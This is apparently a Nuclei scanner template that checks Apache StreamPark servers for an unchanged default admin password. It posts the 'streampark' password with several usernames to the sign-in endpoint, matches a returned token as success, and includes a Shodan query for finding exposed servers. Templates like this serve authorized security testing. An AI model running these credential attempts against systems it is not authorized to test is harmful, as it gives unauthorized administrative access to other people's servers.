id: apache-streampark-default-login

info:
  name: Apache Streampark 默认口令登录（弱口令）
  author: icarot
  severity: high
  description: |
    该模板通过尝试 Apache Streampark 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/apache/streampark
  classification:
    cpe: cpe:2.3:a:apache:streampark:*:*:*:*:*:*:*:*
  metadata:
    max-request: 4
    vendor: apache
    product: streampark
    shodan-query: title:"Apache StreamPark"
  tags: apache,streampark,default-login,vuln

http:
  - raw:
      - |
        POST /passport/signin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8

        password={{password}}&username={{username}}&loginType=PASSWORD

    attack: pitchfork
    payloads:
      username:
        - admin
        - test1
        - test2
        - test3
      password:
        - streampark

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "application/json")'
          - 'contains_all(body, "userId\":", "username\":", "token\":", "expire\":")'
        condition: and
